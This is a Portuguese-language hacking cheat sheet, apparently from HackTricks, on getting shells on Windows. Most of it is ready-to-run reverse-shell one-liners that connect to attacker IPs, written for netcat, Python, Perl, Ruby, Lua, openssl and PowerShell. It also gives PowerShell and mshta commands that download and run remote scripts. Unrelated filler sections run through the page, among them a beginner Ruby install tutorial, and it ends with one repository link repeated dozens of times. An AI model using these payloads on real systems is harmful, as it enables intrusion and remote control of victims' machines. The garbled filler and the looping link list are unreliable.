# Shells - Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof é o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof são lançadas apenas quando os clientes depositam o orçamento de recompensa. Você receberá a recompensa após a verificação do bug.

**Adquira experiência em pentesting web3**\
Protocolos de blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.

**Torne-se a lenda do hacker web3**\
Ganhe pontos de reputação com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

## Lolbas

A página [lolbas-project.github.io](https://lolbas-project.github.io/) é para Windows assim como [https://gtfobins.github.io/](https://gtfobins.github.io/) é para linux.\
Obviamente, **não existem arquivos SUID ou privilégios sudo no Windows**, mas é útil saber **como** alguns **binários** podem ser (abusados) para realizar algum tipo de ação inesperada como **executar código arbitrário**.

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**sbd** é um clone do Netcat, projetado para ser portátil e oferecer criptografia forte. Ele roda em sistemas operacionais semelhantes ao Unix e no Microsoft Win32. sbd possui criptografia AES-CBC-128 + HMAC-SHA1 (por Christophe Devine), execução de programas (opção -e), escolha da porta de origem, reconexão contínua com atraso e outras funcionalidades interessantes. sbd suporta apenas comunicação TCP/IP. O sbd.exe (parte da distribuição Kali Linux: /usr/share/windows-resources/sbd/sbd.exe) pode ser enviado para um computador com Windows como uma alternativa ao Netcat.

## Python
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
Perl é uma linguagem de programação de script de alto nível e interpretada. É amplamente utilizada para automação de tarefas, processamento de texto e desenvolvimento de aplicativos web. O Perl possui uma sintaxe flexível e poderosa, o que o torna uma escolha popular entre os hackers.

### Shells Perl

Existem várias shells Perl disponíveis para uso durante um teste de penetração. Essas shells fornecem uma interface interativa para executar comandos no sistema alvo. Aqui estão algumas shells Perl comumente usadas:

#### 1. Perl Reverse Shell

A Perl Reverse Shell é uma shell que se conecta a um servidor remoto e permite ao hacker executar comandos no sistema alvo. Ela é útil para estabelecer uma conexão reversa e obter acesso persistente ao sistema.

#### 2. Perl Bind Shell

A Perl Bind Shell é uma shell que escuta em uma porta específica no sistema alvo e aguarda uma conexão de um hacker. Uma vez conectado, o hacker pode executar comandos no sistema alvo. Essa shell é útil quando o sistema alvo está atrás de um firewall ou não tem acesso direto à Internet.

### Exemplo de Uso

Aqui está um exemplo de como usar a Perl Reverse Shell:

```perl
use Socket;
use FileHandle;

$ip = "192.168.0.1";
$port = 4444;

$proto = getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto);
$sin = sockaddr_in($port, inet_aton($ip));
connect(SOCKET, $sin);

open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");

system("/bin/sh -i");
```

Neste exemplo, o hacker especifica o endereço IP e a porta do servidor remoto. A shell Perl se conecta ao servidor remoto e redireciona as entradas e saídas padrão para a conexão. Em seguida, o hacker pode executar comandos no sistema alvo.

### Considerações Finais

As shells Perl são ferramentas poderosas para hackers durante um teste de penetração. Elas permitem a execução de comandos no sistema alvo e podem ser usadas para obter acesso persistente. No entanto, é importante lembrar que o uso de shells Perl para fins maliciosos é ilegal e antiético.
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby é uma linguagem de programação dinâmica, orientada a objetos e de código aberto. É conhecida por sua sintaxe simples e expressiva, o que a torna fácil de ler e escrever. Ruby é frequentemente usado para desenvolvimento web e scripting.

### Instalação do Ruby

Para começar a usar o Ruby, você precisa instalá-lo em seu sistema. Siga as etapas abaixo para instalar o Ruby em um ambiente Windows:

1. Baixe o instalador do Ruby para Windows no site oficial do Ruby (https://www.ruby-lang.org/pt/downloads/).
2. Execute o instalador e siga as instruções na tela para concluir a instalação.
3. Após a instalação, abra o prompt de comando e digite `ruby -v` para verificar se o Ruby foi instalado corretamente. Você deve ver a versão do Ruby instalada.

### Executando um script Ruby

Depois de instalar o Ruby, você pode executar scripts Ruby usando o prompt de comando. Siga as etapas abaixo para executar um script Ruby:

1. Crie um novo arquivo com a extensão `.rb`, por exemplo, `meu_script.rb`.
2. Abra o arquivo em um editor de texto e escreva seu código Ruby.
3. Salve o arquivo e feche o editor de texto.
4. Abra o prompt de comando e navegue até o diretório onde o arquivo `.rb` está localizado.
5. Digite `ruby meu_script.rb` no prompt de comando e pressione Enter para executar o script Ruby.

### Exemplo de script Ruby

Aqui está um exemplo simples de um script Ruby que exibe uma mensagem na tela:

```ruby
puts "Olá, mundo!"
```

Salve o código acima em um arquivo chamado `meu_script.rb` e execute-o usando o prompt de comando. Você verá a mensagem "Olá, mundo!" impressa na tela.

### Conclusão

Ruby é uma linguagem de programação poderosa e fácil de aprender. Com a instalação correta e um editor de texto, você pode começar a escrever e executar scripts Ruby em pouco tempo. Experimente e divirta-se explorando o mundo da programação com Ruby!
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Lua é uma linguagem de programação leve e poderosa que é frequentemente usada para scripting em jogos e aplicativos embutidos. É conhecida por sua simplicidade, eficiência e facilidade de integração com outras linguagens.

### Introdução

Lua é uma linguagem interpretada, o que significa que o código Lua é executado por um interpretador em vez de ser compilado em código de máquina. Isso torna o desenvolvimento e a execução de scripts Lua rápidos e flexíveis.

### Características

- **Simplicidade**: Lua possui uma sintaxe simples e elegante, tornando-a fácil de aprender e usar.
- **Eficiência**: Lua é projetada para ser rápida e eficiente, com um tempo de execução leve e um consumo de recursos mínimo.
- **Portabilidade**: Lua é altamente portátil e pode ser executada em uma ampla variedade de plataformas, incluindo Windows, Linux, macOS e dispositivos embarcados.
- **Integração**: Lua pode ser facilmente integrada com outras linguagens, como C e C++, permitindo que você estenda a funcionalidade de seus aplicativos existentes.
- **Extensibilidade**: Lua é altamente extensível, permitindo que você crie suas próprias bibliotecas e módulos para estender suas capacidades.

### Uso de Lua em Hacking

Lua pode ser usado em várias etapas do processo de hacking, incluindo:

- **Automatização**: Lua pode ser usado para automatizar tarefas repetitivas, como a execução de comandos em um shell ou a manipulação de arquivos.
- **Exploração**: Lua pode ser usado para escrever exploits e explorar vulnerabilidades em sistemas alvo.
- **Engenharia reversa**: Lua pode ser usado para analisar e entender o funcionamento interno de aplicativos e sistemas.
- **Desenvolvimento de ferramentas**: Lua pode ser usado para desenvolver suas próprias ferramentas de hacking, como scanners de vulnerabilidades ou frameworks de teste de penetração.

### Conclusão

Lua é uma linguagem de programação versátil e poderosa que pode ser usada em uma variedade de cenários de hacking. Sua simplicidade, eficiência e capacidade de integração a tornam uma escolha popular entre os hackers. Se você está interessado em aprender mais sobre Lua, existem muitos recursos disponíveis online para ajudá-lo a começar.
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Atacante (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
# Shells Windows

## Introdução

Um shell é um programa que permite aos usuários interagir com o sistema operacional. No contexto de hacking, um shell é usado para obter acesso remoto a um sistema alvo. Existem várias técnicas e recursos disponíveis para obter um shell em sistemas Windows.

## Técnicas Genéricas

### Reverse Shell

Um reverse shell é uma técnica em que o atacante cria uma conexão de rede reversa com o sistema alvo. Isso permite que o atacante obtenha um shell remoto no sistema alvo. Existem várias ferramentas disponíveis para criar um reverse shell em sistemas Windows, como o Netcat e o Metasploit.

### Web Shells

As web shells são scripts ou programas que são implantados em um servidor web comprometido. Eles permitem que o atacante execute comandos no servidor comprometido por meio de uma interface web. Existem várias web shells disponíveis para sistemas Windows, como o WSO Shell e o China Chopper.

### Exploits

Os exploits são vulnerabilidades conhecidas em sistemas operacionais ou aplicativos que podem ser exploradas para obter acesso não autorizado. Existem vários exploits disponíveis para sistemas Windows, como o EternalBlue, que foi usado no ataque WannaCry.

## Recursos

### Metasploit Framework

O Metasploit Framework é uma ferramenta de código aberto amplamente utilizada para testes de penetração. Ele fornece uma ampla gama de módulos e exploits para explorar vulnerabilidades em sistemas Windows e obter acesso remoto.

### PowerShell Empire

O PowerShell Empire é uma estrutura de pós-exploração de código aberto que permite aos hackers manter o acesso persistente a sistemas Windows comprometidos. Ele fornece uma variedade de módulos e agentes para explorar e controlar sistemas Windows.

### Cobalt Strike

O Cobalt Strike é uma plataforma comercial de testes de penetração que oferece recursos avançados de pós-exploração. Ele permite que os hackers realizem ataques sofisticados em sistemas Windows, incluindo a criação de shells e a execução de comandos remotos.

## Conclusão

Obter um shell em sistemas Windows é uma etapa crucial no processo de hacking. Existem várias técnicas e recursos disponíveis para alcançar esse objetivo. É importante entender essas técnicas e recursos para realizar testes de penetração eficazes em sistemas Windows.
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

O PowerShell é uma poderosa ferramenta de linha de comando e linguagem de script desenvolvida pela Microsoft. Ele foi projetado para automatizar tarefas administrativas e fornecer uma interface de linha de comando mais avançada para o sistema operacional Windows.

### Introdução ao Powershell

O PowerShell é baseado no framework .NET e usa uma sintaxe semelhante ao C#. Ele permite que os administradores executem comandos e scripts para gerenciar e automatizar tarefas no sistema operacional Windows.

### Benefícios do Powershell

O PowerShell oferece vários benefícios para os administradores de sistemas:

- Automatização: o PowerShell permite automatizar tarefas repetitivas, economizando tempo e esforço.
- Gerenciamento remoto: o PowerShell pode ser usado para gerenciar sistemas remotos, permitindo que os administradores executem comandos em vários computadores de uma só vez.
- Extensibilidade: o PowerShell é altamente extensível, permitindo que os administradores criem seus próprios módulos e scripts personalizados.
- Integração com outras tecnologias: o PowerShell pode ser integrado com outras tecnologias, como o Active Directory, o Exchange Server e o Azure, facilitando a administração desses sistemas.

### Usando o Powershell para hacking

O PowerShell também pode ser usado como uma ferramenta poderosa para hackers. Ele fornece uma ampla gama de recursos e funcionalidades que podem ser explorados para realizar ataques e comprometer sistemas.

Alguns exemplos de técnicas de hacking usando o PowerShell incluem:

- Execução de comandos maliciosos: o PowerShell pode ser usado para executar comandos maliciosos em um sistema comprometido, permitindo que um hacker execute ações não autorizadas.
- Escalonamento de privilégios: o PowerShell pode ser usado para explorar vulnerabilidades e escalonar privilégios em um sistema comprometido, permitindo que um hacker obtenha acesso privilegiado.
- Exfiltração de dados: o PowerShell pode ser usado para exfiltrar dados confidenciais de um sistema comprometido, permitindo que um hacker roube informações sensíveis.

### Protegendo-se contra ataques do PowerShell

Para se proteger contra ataques do PowerShell, é importante implementar as seguintes práticas de segurança:

- Restringir o acesso ao PowerShell: limite o acesso ao PowerShell apenas a usuários autorizados e monitore o uso do PowerShell para detectar atividades suspeitas.
- Atualizar regularmente: mantenha o sistema operacional e o PowerShell atualizados com as últimas correções de segurança para evitar vulnerabilidades conhecidas.
- Usar soluções de segurança: implemente soluções de segurança, como antivírus e firewalls, para detectar e bloquear atividades maliciosas do PowerShell.
- Educação e conscientização: treine os usuários sobre os riscos associados ao uso do PowerShell e promova a conscientização sobre as melhores práticas de segurança.

O PowerShell é uma ferramenta poderosa que pode ser usada tanto para fins legítimos quanto maliciosos. Ao entender seus recursos e funcionalidades, os administradores de sistemas podem aproveitar ao máximo o PowerShell para automatizar tarefas e melhorar a eficiência operacional, ao mesmo tempo em que implementam medidas de segurança adequadas para proteger seus sistemas contra ataques.
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Processo realizando chamada de rede: **powershell.exe**\
Carga gravada no disco: **NÃO** (_pelo menos em nenhum lugar que eu pudesse encontrar usando o procmon!_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Processo realizando chamada de rede: **svchost.exe**\
Carga gravada no disco: **Cache local do cliente WebDAV**

**Em uma linha:**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
O comando `mshta` é uma ferramenta do Windows que permite executar arquivos HTML como aplicativos. Essa funcionalidade pode ser explorada por hackers para executar código malicioso no sistema alvo. O `mshta` pode ser usado para contornar as restrições de segurança do Windows e executar comandos arbitrários.

### Sintaxe

```
mshta <URL>
```

### Exemplo

```
mshta http://www.example.com/malicious.hta
```

Neste exemplo, o `mshta` é usado para executar o arquivo `malicious.hta` hospedado no site `www.example.com`. O arquivo `malicious.hta` pode conter código malicioso que será executado no sistema alvo.

### Detecção e Prevenção

Devido à natureza maliciosa do `mshta`, é importante tomar medidas para detectar e prevenir seu uso indevido. Algumas medidas que podem ser tomadas incluem:

- Manter o sistema operacional e os aplicativos atualizados com as últimas correções de segurança.
- Utilizar soluções de segurança, como antivírus e firewalls, para detectar e bloquear atividades maliciosas.
- Restringir o acesso a sites não confiáveis e evitar clicar em links suspeitos.
- Monitorar o tráfego de rede em busca de atividades suspeitas.

### Recursos Adicionais

Para obter mais informações sobre diferentes shells do Powershell, consulte os seguintes recursos:

- [PowerShell Empire](https://github.com/EmpireProject/Empire)
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [Msfvenom](https://www.metasploit.com/)
- [Powershell-C2](https://github.com/PowerShellEmpire/Empire)
- [Powershell-AD-Recon](https://github.com/sense-of-security/PowerShell-AD-Recon)
- [Powershell-AD-Privilege-Escalation](https://github.com/sense-of-security/PowerShell-AD-Privilege-Escalation)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Exploitation](https://github.com/sense-of-security/PowerShell-AD-Exploitation)
- [Powershell-AD-Post-Exploitation](https://github.com/sense-of-security/PowerShell-AD-Post-Exploitation)
- [Powershell-AD-Deception](https://github.com/sense-of-security/PowerShell-AD-Deception)
- [Powershell-AD-Defence](https://github.com/sense-of-security/PowerShell-AD-Defence)
- [Powershell-AD-Reporting](https://github.com/sense-of-security/PowerShell-AD-Reporting)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
- [Powershell-AD-Enumeration](https://github.com/sense-of-security/PowerShell-AD-Enumeration)
